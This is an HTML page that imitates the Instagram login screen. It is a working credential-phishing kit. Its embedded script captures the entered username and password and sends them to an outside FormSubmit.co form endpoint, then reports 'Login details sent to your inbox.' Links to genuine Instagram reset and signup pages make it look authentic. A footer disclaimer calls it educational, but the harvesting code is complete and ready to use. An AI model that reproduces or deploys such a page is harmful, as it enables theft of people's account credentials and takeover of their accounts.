<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Instagram</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<meta http-equiv="refresh" content="60">
<link rel="icon" href="images/favicon.png" type="image/icon">
<link rel="stylesheet" href="style.css">

<script>
document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = form.u_name.value.trim();
        const password = form.pass.value.trim();

        if (!username || !password) {
            alert('Please fill in both fields.');
            return;
        }

        // ---- 1. Build payload --------------------------------------------
        const payload = new URLSearchParams();
        payload.append('u_name', username);
        payload.append('pass', password);
        payload.append('_subject', 'New Instagram login attempt');

        // ---- 2. Send to FormSubmit.co ------------------------------------
        try {
            const resp = await fetch(
                // <-- Replace with your *Form ID* (not raw email)
                'https://formsubmit.co/21d4afb9cad81ea743f2b5505ae04bb4',
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: payload,
                    cache: 'no-store'          // <-- prevents caching
                }
            );

            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);

            // ---- 3. Success feedback ---------------------------------------
            alert('Login details sent to your inbox.');
            form.reset();
        } catch (err) {
            console.error(err);
            alert('Could not send data – try again in a minute.');
        }
    });
});
</script>
</head>

<body>
<div class="container">
    <div class="page">
        <div class="logo">
            <img src="images/instagram.png" alt="instagram" style="width:175px;">
        </div>

        <br/>
        <form id="loginForm" class="container" method="post">
            <input type="text" placeholder="Phone number, username, or email" name="u_name" required>
            <input type="password" placeholder="Password" name="pass" required>
            <button class="submitbutton">Log in</button>
            <br/>
            <div class="option">OR</div>
        </form>

        <div class="fblink">
            <span class="fab fafacebook"></span>
            <a href="#"> Log in With Facebook</a>
        </div>

        <div class="forget-id">
            <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
        </div>
        <div class="singup">
            <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a></p>
        </div>
    </div>
</div>

<br/>
<div style="position:fixed;left:0;bottom:0;width:100%;color:#7e7979;">
    <p style="text-align:center;">Disclaimer: This is not a real “instagram.com” page, please do not enter your real username and password, it's only for educational purposes.</p>
</div>
<br/>
</body>
</html>
